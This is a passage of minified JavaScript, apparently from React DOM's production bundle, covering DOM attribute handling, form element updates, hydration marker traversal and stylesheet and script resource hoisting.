x=`onCompositionStart`;break b;case`compositionend`:x=`onCompositionEnd`;break b;case`compositionupdate`:x=`onCompositionUpdate`;break b}x=void 0}else cr?or(e,n)&&(x=`onCompositionEnd`):e===`keydown`&&n.keyCode===229&&(x=`onCompositionStart`);x&&(rr&&n.locale!==`ko`&&(cr||x!==`onCompositionStart`?x===`onCompositionEnd`&&cr&&(b=Cn()):(bn=i,xn=`value`in bn?bn.value:bn.textContent,cr=!0)),y=Md(r,x),0<y.length&&(x=new Vn(x,e,null,n,i),s.push({event:x,listeners:y}),b?x.data=b:(b=sr(n),b!==null&&(x.data=b)))),(b=nr?lr(e,n):ur(e,n))&&(x=Md(r,`onBeforeInput`),0<x.length&&(y=new Vn(`onBeforeInput`,`beforeinput`,null,n,i),s.push({event:y,listeners:x}),y.data=b)),bd(s,e,r,n,i)}Td(s,t)})}function jd(e,t,n){return{instance:e,listener:t,currentTarget:n}}function Md(e,t){for(var n=t+`Capture`,r=[];e!==null;){var i=e,a=i.stateNode;if(i=i.tag,i!==5&&i!==26&&i!==27||a===null||(i=gn(e,n),i!=null&&r.unshift(jd(e,i,a)),i=gn(e,t),i!=null&&r.push(jd(e,i,a))),e.tag===3)return r;e=e.return}return[]}function Nd(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function Pd(e,t,n,r,i){for(var a=t._reactName,o=[];n!==null&&n!==r;){var s=n,c=s.alternate,l=s.stateNode;if(s=s.tag,c!==null&&c===r)break;s!==5&&s!==26&&s!==27||l===null||(c=l,i?(l=gn(n,a),l!=null&&o.unshift(jd(n,l,c))):i||(l=gn(n,a),l!=null&&o.push(jd(n,l,c)))),n=n.return}o.length!==0&&e.push({event:t,listeners:o})}var Fd=/\r\n?/g,Id=/\u0000|\uFFFD/g;function Ld(e){return(typeof e==`string`?e:``+e).replace(Fd,`
`).replace(Id,``)}function Rd(e,t){return t=Ld(t),Ld(e)===t}function q(e,t,n,r,a,o){switch(n){case`children`:typeof r==`string`?t===`body`||t===`textarea`&&r===``||$t(e,r):(typeof r==`number`||typeof r==`bigint`)&&t!==`body`&&$t(e,``+r);break;case`className`:Lt(e,`class`,r);break;case`tabIndex`:Lt(e,`tabindex`,r);break;case`dir`:case`role`:case`viewBox`:case`width`:case`height`:Lt(e,n,r);break;case`style`:nn(e,r,o);break;case`data`:if(t!==`object`){Lt(e,`data`,r);break}case`src`:case`href`:if(r===``&&(t!==`a`||n!==`href`)){e.removeAttribute(n);break}if(r==null||typeof r==`function`||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=sn(``+r),e.setAttribute(n,r);break;case`action`:case`formAction`:if(typeof r==`function`){e.setAttribute(n,`javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')`);break}else typeof o==`function`&&(n===`formAction`?(t!==`input`&&q(e,t,`name`,a.name,a,null),q(e,t,`formEncType`,a.formEncType,a,null),q(e,t,`formMethod`,a.formMethod,a,null),q(e,t,`formTarget`,a.formTarget,a,null)):(q(e,t,`encType`,a.encType,a,null),q(e,t,`method`,a.method,a,null),q(e,t,`target`,a.target,a,null)));if(r==null||typeof r==`symbol`||typeof r==`boolean`){e.removeAttribute(n);break}r=sn(``+r),e.setAttribute(n,r);break;case`onClick`:r!=null&&(e.onclick=cn);break;case`onScroll`:r!=null&&K(`scroll`,e);break;case`onScrollEnd`:r!=null&&K(`scrollend`,e);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));e.innerHTML=n}}break;case`multiple`:e.multiple=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`muted`:e.muted=r&&typeof r!=`function`&&typeof r!=`symbol`;break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`defaultValue`:case`defaultChecked`:case`innerHTML`:case`ref`:break;case`autoFocus`:break;case`xlinkHref`:if(r==null||typeof r==`function`||typeof r==`boolean`||typeof r==`symbol`){e.removeAttribute(`xlink:href`);break}n=sn(``+r),e.setAttributeNS(`http://www.w3.org/1999/xlink`,`xlink:href`,n);break;case`contentEditable`:case`spellCheck`:case`draggable`:case`value`:case`autoReverse`:case`externalResourcesRequired`:case`focusable`:case`preserveAlpha`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``+r):e.removeAttribute(n);break;case`inert`:case`allowFullScreen`:case`async`:case`autoPlay`:case`controls`:case`default`:case`defer`:case`disabled`:case`disablePictureInPicture`:case`disableRemotePlayback`:case`formNoValidate`:case`hidden`:case`loop`:case`noModule`:case`noValidate`:case`open`:case`playsInline`:case`readOnly`:case`required`:case`reversed`:case`scoped`:case`seamless`:case`itemScope`:r&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,``):e.removeAttribute(n);break;case`capture`:case`download`:!0===r?e.setAttribute(n,``):!1!==r&&r!=null&&typeof r!=`function`&&typeof r!=`symbol`?e.setAttribute(n,r):e.removeAttribute(n);break;case`cols`:case`rows`:case`size`:case`span`:r!=null&&typeof r!=`function`&&typeof r!=`symbol`&&!isNaN(r)&&1<=r?e.setAttribute(n,r):e.removeAttribute(n);break;case`rowSpan`:case`start`:r==null||typeof r==`function`||typeof r==`symbol`||isNaN(r)?e.removeAttribute(n):e.setAttribute(n,r);break;case`popover`:K(`beforetoggle`,e),K(`toggle`,e),It(e,`popover`,r);break;case`xlinkActuate`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:actuate`,r);break;case`xlinkArcrole`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:arcrole`,r);break;case`xlinkRole`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:role`,r);break;case`xlinkShow`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:show`,r);break;case`xlinkTitle`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:title`,r);break;case`xlinkType`:Rt(e,`http://www.w3.org/1999/xlink`,`xlink:type`,r);break;case`xmlBase`:Rt(e,`http://www.w3.org/XML/1998/namespace`,`xml:base`,r);break;case`xmlLang`:Rt(e,`http://www.w3.org/XML/1998/namespace`,`xml:lang`,r);break;case`xmlSpace`:Rt(e,`http://www.w3.org/XML/1998/namespace`,`xml:space`,r);break;case`is`:It(e,`is`,r);break;case`innerText`:case`textContent`:break;default:(!(2<n.length)||n[0]!==`o`&&n[0]!==`O`||n[1]!==`n`&&n[1]!==`N`)&&(n=an.get(n)||n,It(e,n,r))}}function zd(e,t,n,r,a,o){switch(n){case`style`:nn(e,r,o);break;case`dangerouslySetInnerHTML`:if(r!=null){if(typeof r!=`object`||!(`__html`in r))throw Error(i(61));if(n=r.__html,n!=null){if(a.children!=null)throw Error(i(60));e.innerHTML=n}}break;case`children`:typeof r==`string`?$t(e,r):(typeof r==`number`||typeof r==`bigint`)&&$t(e,``+r);break;case`onScroll`:r!=null&&K(`scroll`,e);break;case`onScrollEnd`:r!=null&&K(`scrollend`,e);break;case`onClick`:r!=null&&(e.onclick=cn);break;case`suppressContentEditableWarning`:case`suppressHydrationWarning`:case`innerHTML`:case`ref`:break;case`innerText`:case`textContent`:break;default:if(!kt.hasOwnProperty(n))a:{if(n[0]===`o`&&n[1]===`n`&&(a=n.endsWith(`Capture`),t=n.slice(2,a?n.length-7:void 0),o=e[ht]||null,o=o==null?null:o[n],typeof o==`function`&&e.removeEventListener(t,o,a),typeof r==`function`)){typeof o!=`function`&&o!==null&&(n in e?e[n]=null:e.hasAttribute(n)&&e.removeAttribute(n)),e.addEventListener(t,r,a);break a}n in e?e[n]=r:!0===r?e.setAttribute(n,``):It(e,n,r)}}}function Bd(e,t,n){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`img`:K(`error`,e),K(`load`,e);var r=!1,a=!1,o;for(o in n)if(n.hasOwnProperty(o)){var s=n[o];if(s!=null)switch(o){case`src`:r=!0;break;case`srcSet`:a=!0;break;case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:q(e,t,o,s,n,null)}}a&&q(e,t,`srcSet`,n.srcSet,n,null),r&&q(e,t,`src`,n.src,n,null);return;case`input`:K(`invalid`,e);var c=o=s=a=null,l=null,u=null;for(r in n)if(n.hasOwnProperty(r)){var d=n[r];if(d!=null)switch(r){case`name`:a=d;break;case`type`:s=d;break;case`checked`:l=d;break;case`defaultChecked`:u=d;break;case`value`:o=d;break;case`defaultValue`:c=d;break;case`children`:case`dangerouslySetInnerHTML`:if(d!=null)throw Error(i(137,t));break;default:q(e,t,r,d,n,null)}}Jt(e,o,c,l,u,s,a,!1);return;case`select`:for(a in K(`invalid`,e),r=s=o=null,n)if(n.hasOwnProperty(a)&&(c=n[a],c!=null))switch(a){case`value`:o=c;break;case`defaultValue`:s=c;break;case`multiple`:r=c;default:q(e,t,a,c,n,null)}t=o,n=s,e.multiple=!!r,t==null?n!=null&&Xt(e,!!r,n,!0):Xt(e,!!r,t,!1);return;case`textarea`:for(s in K(`invalid`,e),o=a=r=null,n)if(n.hasOwnProperty(s)&&(c=n[s],c!=null))switch(s){case`value`:r=c;break;case`defaultValue`:a=c;break;case`children`:o=c;break;case`dangerouslySetInnerHTML`:if(c!=null)throw Error(i(91));break;default:q(e,t,s,c,n,null)}Qt(e,r,a,o);return;case`option`:for(l in n)if(n.hasOwnProperty(l)&&(r=n[l],r!=null))switch(l){case`selected`:e.selected=r&&typeof r!=`function`&&typeof r!=`symbol`;break;default:q(e,t,l,r,n,null)}return;case`dialog`:K(`beforetoggle`,e),K(`toggle`,e),K(`cancel`,e),K(`close`,e);break;case`iframe`:case`object`:K(`load`,e);break;case`video`:case`audio`:for(r=0;r<Cd.length;r++)K(Cd[r],e);break;case`image`:K(`error`,e),K(`load`,e);break;case`details`:K(`toggle`,e);break;case`embed`:case`source`:case`link`:K(`error`,e),K(`load`,e);case`area`:case`base`:case`br`:case`col`:case`hr`:case`keygen`:case`meta`:case`param`:case`track`:case`wbr`:case`menuitem`:for(u in n)if(n.hasOwnProperty(u)&&(r=n[u],r!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:throw Error(i(137,t));default:q(e,t,u,r,n,null)}return;default:if(rn(t)){for(d in n)n.hasOwnProperty(d)&&(r=n[d],r!==void 0&&zd(e,t,d,r,n,void 0));return}}for(c in n)n.hasOwnProperty(c)&&(r=n[c],r!=null&&q(e,t,c,r,n,null))}function Vd(e,t,n,r){switch(t){case`div`:case`span`:case`svg`:case`path`:case`a`:case`g`:case`p`:case`li`:break;case`input`:var a=null,o=null,s=null,c=null,l=null,u=null,d=null;for(m in n){var f=n[m];if(n.hasOwnProperty(m)&&f!=null)switch(m){case`checked`:break;case`value`:break;case`defaultValue`:l=f;default:r.hasOwnProperty(m)||q(e,t,m,null,r,f)}}for(var p in r){var m=r[p];if(f=n[p],r.hasOwnProperty(p)&&(m!=null||f!=null))switch(p){case`type`:o=m;break;case`name`:a=m;break;case`checked`:u=m;break;case`defaultChecked`:d=m;break;case`value`:s=m;break;case`defaultValue`:c=m;break;case`children`:case`dangerouslySetInnerHTML`:if(m!=null)throw Error(i(137,t));break;default:m!==f&&q(e,t,p,m,r,f)}}qt(e,s,c,l,u,d,o,a);return;case`select`:for(o in m=s=c=p=null,n)if(l=n[o],n.hasOwnProperty(o)&&l!=null)switch(o){case`value`:break;case`multiple`:m=l;default:r.hasOwnProperty(o)||q(e,t,o,null,r,l)}for(a in r)if(o=r[a],l=n[a],r.hasOwnProperty(a)&&(o!=null||l!=null))switch(a){case`value`:p=o;break;case`defaultValue`:c=o;break;case`multiple`:s=o;default:o!==l&&q(e,t,a,o,r,l)}t=c,n=s,r=m,p==null?!!r!=!!n&&(t==null?Xt(e,!!n,n?[]:``,!1):Xt(e,!!n,t,!0)):Xt(e,!!n,p,!1);return;case`textarea`:for(c in m=p=null,n)if(a=n[c],n.hasOwnProperty(c)&&a!=null&&!r.hasOwnProperty(c))switch(c){case`value`:break;case`children`:break;default:q(e,t,c,null,r,a)}for(s in r)if(a=r[s],o=n[s],r.hasOwnProperty(s)&&(a!=null||o!=null))switch(s){case`value`:p=a;break;case`defaultValue`:m=a;break;case`children`:break;case`dangerouslySetInnerHTML`:if(a!=null)throw Error(i(91));break;default:a!==o&&q(e,t,s,a,r,o)}Zt(e,p,m);return;case`option`:for(var h in n)if(p=n[h],n.hasOwnProperty(h)&&p!=null&&!r.hasOwnProperty(h))switch(h){case`selected`:e.selected=!1;break;default:q(e,t,h,null,r,p)}for(l in r)if(p=r[l],m=n[l],r.hasOwnProperty(l)&&p!==m&&(p!=null||m!=null))switch(l){case`selected`:e.selected=p&&typeof p!=`function`&&typeof p!=`symbol`;break;default:q(e,t,l,p,r,m)}return;case`img`:case`link`:case`area`:case`base`:case`br`:case`col`:case`embed`:case`hr`:case`keygen`:case`meta`:case`param`:case`source`:case`track`:case`wbr`:case`menuitem`:for(var g in n)p=n[g],n.hasOwnProperty(g)&&p!=null&&!r.hasOwnProperty(g)&&q(e,t,g,null,r,p);for(u in r)if(p=r[u],m=n[u],r.hasOwnProperty(u)&&p!==m&&(p!=null||m!=null))switch(u){case`children`:case`dangerouslySetInnerHTML`:if(p!=null)throw Error(i(137,t));break;default:q(e,t,u,p,r,m)}return;default:if(rn(t)){for(var _ in n)p=n[_],n.hasOwnProperty(_)&&p!==void 0&&!r.hasOwnProperty(_)&&zd(e,t,_,void 0,r,p);for(d in r)p=r[d],m=n[d],!r.hasOwnProperty(d)||p===m||p===void 0&&m===void 0||zd(e,t,d,p,r,m);return}}for(var v in n)p=n[v],n.hasOwnProperty(v)&&p!=null&&!r.hasOwnProperty(v)&&q(e,t,v,null,r,p);for(f in r)p=r[f],m=n[f],!r.hasOwnProperty(f)||p===m||p==null&&m==null||q(e,t,f,p,r,m)}function Hd(e){switch(e){case`css`:case`script`:case`font`:case`img`:case`image`:case`input`:case`link`:return!0;default:return!1}}function Ud(){if(typeof performance.getEntriesByType==`function`){for(var e=0,t=0,n=performance.getEntriesByType(`resource`),r=0;r<n.length;r++){var i=n[r],a=i.transferSize,o=i.initiatorType,s=i.duration;if(a&&s&&Hd(o)){for(o=0,s=i.responseEnd,r+=1;r<n.length;r++){var c=n[r],l=c.startTime;if(l>s)break;var u=c.transferSize,d=c.initiatorType;u&&Hd(d)&&(c=c.responseEnd,o+=u*(c<s?1:(s-l)/(c-l)))}if(--r,t+=8*(a+o)/(i.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e==`number`)?e:5}var Wd=null,Gd=null;function Kd(e){return e.nodeType===9?e:e.ownerDocument}function qd(e){switch(e){case`http://www.w3.org/2000/svg`:return 1;case`http://www.w3.org/1998/Math/MathML`:return 2;default:return 0}}function Jd(e,t){if(e===0)switch(t){case`svg`:return 1;case`math`:return 2;default:return 0}return e===1&&t===`foreignObject`?0:e}function Yd(e,t){return e===`textarea`||e===`noscript`||typeof t.children==`string`||typeof t.children==`number`||typeof t.children==`bigint`||typeof t.dangerouslySetInnerHTML==`object`&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Xd=null;function Zd(){var e=window.event;return e&&e.type===`popstate`?e===Xd?!1:(Xd=e,!0):(Xd=null,!1)}var Qd=typeof setTimeout==`function`?setTimeout:void 0,$d=typeof clearTimeout==`function`?clearTimeout:void 0,ef=typeof Promise==`function`?Promise:void 0,tf=typeof queueMicrotask==`function`?queueMicrotask:ef===void 0?Qd:function(e){return ef.resolve(null).then(e).catch(nf)};function nf(e){setTimeout(function(){throw e})}function rf(e){return e===`head`}function af(e,t){var n=t,r=0;do{var i=n.nextSibling;if(e.removeChild(n),i&&i.nodeType===8)if(n=i.data,n===`/$`||n===`/&`){if(r===0){e.removeChild(i),Rp(t);return}r--}else if(n===`$`||n===`$?`||n===`$~`||n===`$!`||n===`&`)r++;else if(n===`html`)yf(e.ownerDocument.documentElement);else if(n===`head`){n=e.ownerDocument.head,yf(n);for(var a=n.firstChild;a;){var o=a.nextSibling,s=a.nodeName;a[xt]||s===`SCRIPT`||s===`STYLE`||s===`LINK`&&a.rel.toLowerCase()===`stylesheet`||n.removeChild(a),a=o}}else n===`body`&&yf(e.ownerDocument.body);n=i}while(n);Rp(t)}function of(e,t){var n=e;e=0;do{var r=n.nextSibling;if(n.nodeType===1?t?(n._stashedDisplay=n.style.display,n.style.display=`none`):(n.style.display=n._stashedDisplay||``,n.getAttribute(`style`)===``&&n.removeAttribute(`style`)):n.nodeType===3&&(t?(n._stashedText=n.nodeValue,n.nodeValue=``):n.nodeValue=n._stashedText||``),r&&r.nodeType===8)if(n=r.data,n===`/$`){if(e===0)break;e--}else n!==`$`&&n!==`$?`&&n!==`$~`&&n!==`$!`||e++;n=r}while(n)}function sf(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var n=t;switch(t=t.nextSibling,n.nodeName){case`HTML`:case`HEAD`:case`BODY`:sf(n),St(n);continue;case`SCRIPT`:case`STYLE`:continue;case`LINK`:if(n.rel.toLowerCase()===`stylesheet`)continue}e.removeChild(n)}}function cf(e,t,n,r){for(;e.nodeType===1;){var i=n;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!r&&(e.nodeName!==`INPUT`||e.type!==`hidden`))break}else if(!r)if(t===`input`&&e.type===`hidden`){var a=i.name==null?null:``+i.name;if(i.type===`hidden`&&e.getAttribute(`name`)===a)return e}else return e;else if(!e[xt])switch(t){case`meta`:if(!e.hasAttribute(`itemprop`))break;return e;case`link`:if(a=e.getAttribute(`rel`),a===`stylesheet`&&e.hasAttribute(`data-precedence`)||a!==i.rel||e.getAttribute(`href`)!==(i.href==null||i.href===``?null:i.href)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin)||e.getAttribute(`title`)!==(i.title==null?null:i.title))break;return e;case`style`:if(e.hasAttribute(`data-precedence`))break;return e;case`script`:if(a=e.getAttribute(`src`),(a!==(i.src==null?null:i.src)||e.getAttribute(`type`)!==(i.type==null?null:i.type)||e.getAttribute(`crossorigin`)!==(i.crossOrigin==null?null:i.crossOrigin))&&a&&e.hasAttribute(`async`)&&!e.hasAttribute(`itemprop`))break;return e;default:return e}if(e=mf(e.nextSibling),e===null)break}return null}function lf(e,t,n){if(t===``)return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!n||(e=mf(e.nextSibling),e===null))return null;return e}function uf(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!==`INPUT`||e.type!==`hidden`)&&!t||(e=mf(e.nextSibling),e===null))return null;return e}function df(e){return e.data===`$?`||e.data===`$~`}function ff(e){return e.data===`$!`||e.data===`$?`&&e.ownerDocument.readyState!==`loading`}function pf(e,t){var n=e.ownerDocument;if(e.data===`$~`)e._reactRetry=t;else if(e.data!==`$?`||n.readyState!==`loading`)t();else{var r=function(){t(),n.removeEventListener(`DOMContentLoaded`,r)};n.addEventListener(`DOMContentLoaded`,r),e._reactRetry=r}}function mf(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t===`$`||t===`$!`||t===`$?`||t===`$~`||t===`&`||t===`F!`||t===`F`)break;if(t===`/$`||t===`/&`)return null}}return e}var hf=null;function gf(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`/$`||n===`/&`){if(t===0)return mf(e.nextSibling);t--}else n!==`$`&&n!==`$!`&&n!==`$?`&&n!==`$~`&&n!==`&`||t++}e=e.nextSibling}return null}function _f(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var n=e.data;if(n===`$`||n===`$!`||n===`$?`||n===`$~`||n===`&`){if(t===0)return e;t--}else n!==`/$`&&n!==`/&`||t++}e=e.previousSibling}return null}function vf(e,t,n){switch(t=Kd(n),e){case`html`:if(e=t.documentElement,!e)throw Error(i(452));return e;case`head`:if(e=t.head,!e)throw Error(i(453));return e;case`body`:if(e=t.body,!e)throw Error(i(454));return e;default:throw Error(i(451))}}function yf(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);St(e)}var bf=new Map,xf=new Set;function Sf(e){return typeof e.getRootNode==`function`?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var Cf=A.d;A.d={f:wf,r:Tf,D:Of,C:kf,L:Af,m:jf,X:Nf,S:Mf,M:Pf};function wf(){var e=Cf.f(),t=Du();return e||t}function Tf(e){var t=wt(e);t!==null&&t.tag===5&&t.type===`form`?js(t):Cf.r(e)}var Ef=typeof document>`u`?null:document;function Df(e,t,n){var r=Ef;if(r&&typeof t==`string`&&t){var i=Kt(t);i=`link[rel="`+e+`"][href="`+i+`"]`,typeof n==`string`&&(i+=`[crossorigin="`+n+`"]`),xf.has(i)||(xf.add(i),e={rel:e,crossOrigin:n,href:t},r.querySelector(i)===null&&(t=r.createElement(`link`),Bd(t,`link`,e),Dt(t),r.head.appendChild(t)))}}function Of(e){Cf.D(e),Df(`dns-prefetch`,e,null)}function kf(e,t){Cf.C(e,t),Df(`preconnect`,e,t)}function Af(e,t,n){Cf.L(e,t,n);var r=Ef;if(r&&e&&t){var i=`link[rel="preload"][as="`+Kt(t)+`"]`;t===`image`&&n&&n.imageSrcSet?(i+=`[imagesrcset="`+Kt(n.imageSrcSet)+`"]`,typeof n.imageSizes==`string`&&(i+=`[imagesizes="`+Kt(n.imageSizes)+`"]`)):i+=`[href="`+Kt(e)+`"]`;var a=i;switch(t){case`style`:a=If(e);break;case`script`:a=Bf(e)}bf.has(a)||(e=f({rel:`preload`,href:t===`image`&&n&&n.imageSrcSet?void 0:e,as:t},n),bf.set(a,e),r.querySelector(i)!==null||t===`style`&&r.querySelector(Lf(a))||t===`script`&&r.querySelector(Vf(a))||(t=r.createElement(`link`),Bd(t,`link`,e),Dt(t),r.head.appendChild(t)))}}function jf(e,t){Cf.m(e,t);var n=Ef;if(n&&e){var r=t&&typeof t.as==`string`?t.as:`script`,i=`link[rel="modulepreload"][as="`+Kt(r)+`"][href="`+Kt(e)+`"]`,a=i;switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:a=Bf(e)}if(!bf.has(a)&&(e=f({rel:`modulepreload`,href:e},t),bf.set(a,e),n.querySelector(i)===null)){switch(r){case`audioworklet`:case`paintworklet`:case`serviceworker`:case`sharedworker`:case`worker`:case`script`:if(n.querySelector(Vf(a)))return}r=n.createElement(`link`),Bd(r,`link`,e),Dt(r),n.head.appendChild(r)}}}function Mf(e,t,n){Cf.S(e,t,n);var r=Ef;if(r&&e){var i=Et(r).hoistableStyles,a=If(e);t||=`default`;var o=i.get(a);if(!o){var s={loading:0,preload:null};if(o=r.querySelector(Lf(a)))s.loading=5;else{e=f({rel:`stylesheet`,href:e,"data-precedence":t},n),(n=bf.get(a))&&Wf(e,n);var c=o=r.createElement(`link`);Dt(c),Bd(c,`link`,e),c._p=new Promise(function(e,t){c.onload=e,c.onerror=t}),c.addEventListener(`load`,function(){s.loading|=1}),c.addEventListener(`error`,function(){s.loading|=2}),s.loading|=4,Uf(o,t,r)}o={type:`stylesheet`,instance:o,count:1,state:s},i.set(a,o)}}}function Nf(e,t){Cf.X(e,t);var n=Ef;if(n&&e){var r=Et(n).hoistableScripts,i=Bf(e),a=r.get(i);a||(a=n.querySelector(Vf(i)),a||(e=f({src:e,async:!0},t),(t=bf.get(i))&&Gf(e,t),a=n.createElement(`script`),Dt(a),Bd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function Pf(e,t){Cf.M(e,t);var n=Ef;if(n&&e){var r=Et(n).hoistableScripts,i=Bf(e),a=r.get(i);a||(a=n.querySelector(Vf(i)),a||(e=f({src:e,async:!0,type:`module`},t),(t=bf.get(i))&&Gf(e,t),a=n.createElement(`script`),Dt(a),Bd(a,`link`,e),n.head.appendChild(a)),a={type:`script`,instance:a,count:1,state:null},r.set(i,a))}}function Ff(e,t,n,r){var a=(a=he.current)?Sf(a):null;if(!a)throw Error(i(446));switch(e){case`meta`:case`title`:return null;case`style`:return typeof n.precedence==`string`&&typeof n.href==`string`?(t=If(n.href),n=Et(a).hoistableStyles,r=n.get(t),r||(r={type:`style`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};case`link`:if(n.rel===`stylesheet`&&typeof n.href==`string`&&typeof n.precedence==`string`){e=If(n.href);var o=Et(a).hoistableStyles,s=o.get(e);if(s||(a=a.ownerDocument||a,s={type:`stylesheet`,instance:null,count:0,state:{loading:0,preload:null}},o.set(e,s),(o=a.querySelector(Lf(e)))&&!o._p&&(s.instance=o,s.state.loading=5),bf.has(e)||(n={rel:`preload`,as:`style`,href:n.href,crossOrigin:n.crossOrigin,integrity:n.integrity,media:n.media,hrefLang:n.hrefLang,referrerPolicy:n.referrerPolicy},bf.set(e,n),o||zf(a,e,n,s.state))),t&&r===null)throw Error(i(528,``));return s}if(t&&r!==null)throw Error(i(529,``));return null;case`script`:return t=n.async,n=n.src,typeof n==`string`&&t&&typeof t!=`function`&&typeof t!=`symbol`?(t=Bf(n),n=Et(a).hoistableScripts,r=n.get(t),r||(r={type:`script`,instance:null,count:0,state:null},n.set(t,r)),r):{type:`void`,instance:null,count:0,state:null};default:throw Error(i(444,e))}}function If(e){return`href="`+Kt(e)+`"`}function Lf(e){return`link[rel="stylesheet"][`+e+`]`}function Rf(e){return f({},e,{"data-precedence":e.precedence,precedence:null})}function zf(e,t,n,r){e.querySelector(`link[rel="preload"][as="style"][`+t+`]`)?r.loading=1:(t=e.createElement(`link`),r.preload=t,t.addEventListener(`load`,function(){return r.loading|=1}),t.addEventListener(`error`,function(){return r.loading|=2}),Bd(t,`link`,n),Dt(t),e.head.appendChild(t))}function Bf(e){return`[src="`+Kt(e)+`"]`}function Vf(e){return`script[async]`+e}function Hf(e,t,n){if(t.count++,t.instance===null)switch(t.type){case`style`:var r=e.querySelector(`style[data-href~="`+Kt(n.href)+`"]`);if(r)return t.instance=r,Dt(r),r;var a=f({},n,{"data-href":n.href,"data-precedence":n.precedence,href:null,precedence:null});return r=(e.ownerDocument||e).createElement(`style`),Dt(r),Bd(r,`style`,a),Uf(r,n.precedence,e),t.instance=r;case`stylesheet`:a=If(n.href);var o=e.querySelector(Lf(a));if(o)return t.state.loading|=4,t.instance=o,Dt(o),o;r=Rf(n),(a=bf.get(a))&&Wf(r,a),o=(e.ownerDocument||e).createElement(`link`),Dt(o);var s=o;return s._p=new Promise(function(e,t){s.onload=e,s.onerror=t}),Bd(o,`link`,r),t.state.loading|=4,Uf(o,n.precedence,e),t.instance=o;case`script`:return o=Bf(n.src),(a=e.querySelector(Vf(o)))?(t.instance=a,Dt(a),a):(r=n,(a=bf.get(o))&&(r=f({},n),Gf(r,a)),e=e.ownerDocument||e,a=e.createElement(`script`),Dt(a),Bd(a,`link`,r),e.head.appendChild(a),t.instance=a);case`void`:return null;default:throw Error(i(443,t.type))}else t.type===`stylesheet`&&!(t.state.loading&4)&&(r=t.instance,t.state.loading|=4,Uf(r,n.precedence,e));return t.instance}function Uf(e,t,n){for(var r=n.querySelectorAll(`link[rel="stylesheet"][data-precedence],style[data-precedence]`),i=r.length?r[r.length-1]:null,a=i,o=0;o<r.length;o++){var s=r[o];if(s.dataset.precedence===t)a=s;else if(a!==i)break}a?a.parentNode.insertBefore(e,a.nextSibling):(t=n.nodeType===9?n.head:n,t.insertBefore(e,t.firstChild))}function Wf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.title??=t.title}function Gf(e,t){e.crossOrigin??=t.crossOrigin,e.referrerPolicy??=t.referrerPolicy,e.integrity??=t.integrity}var Kf=null;function qf(e,t,n){if(Kf===null){var r=new Map,i=Kf=new Map;i.set(n,r)}else i=Kf,r=i.get(n),r||(r=new Map,i.set(n,r));if(r.has(e))return r;for(r.set(e,null),n=n.getElementsByTagName(e),i=0;i<n.length;i++){var a=n[i];if(!(a[xt]||a[mt]||e===`link`&&a.getAttribute(`rel`)===`stylesheet`)&&a.namespaceURI!==`http://www.w3.org/2000/svg`){var o=a.getAttribute(t)||``;o=e+o;var s=r.get(o);s?s.push(a):r.set(o,[a])}}return r}function Jf(e,t,n){e=e.ownerDocument||e,e.head.insertBefore(n,t===`title`?e.querySelector(`head > title`):null)}function Yf(e,t,n){if(n===1||t.itemProp!=null)return!1;switch(e){case`meta`:case`title`:return!0;case`style`:if(typeof t.precedence!=`string`||typeof t.href!=`string`||t.href===``)break;return!0;case`link`:if(typeof t.rel!=`string`||typeof t.href!=`string`||t.href===``||t.onLoad||t.onError)break;switch(t.rel){case`stylesheet`:return e=t.disabled,typeof t.precedence==`string`&&e==null;default:return!0}case`script`:if(t.async&&typeof t.async!=`function`&&typeof t.async!=`symbol`&&!t.onLoad&&!t.onError&&t.src&&typeof t.src==`string`)return!0}return!1}function Xf(e){return!(e.type===`stylesheet`&&!(e.state.loading&3))}function Zf(e,t,n,r){if(n.type===`stylesheet`&&(typeof r.media!=`string`||!1!==matchMedia(r.media).matches)&&!(n.state.loading&4)){if(n.instance===null){var i=If(r.href),a=t.querySelector(Lf(i));if(a){t=a._p,typeof t==`object`&&t&&typeof t.then==`function`&&(e.count++,e=ep.bind(e),t.then(e,e)),n.state.loading|=4,n.instance=a,Dt(a);return}a=t.ownerDocument||t,r=Rf(r),(i=bf.get(i))&&Wf(r,i),a=a.createElement(`link`),Dt(a);var o=a;o._p=new 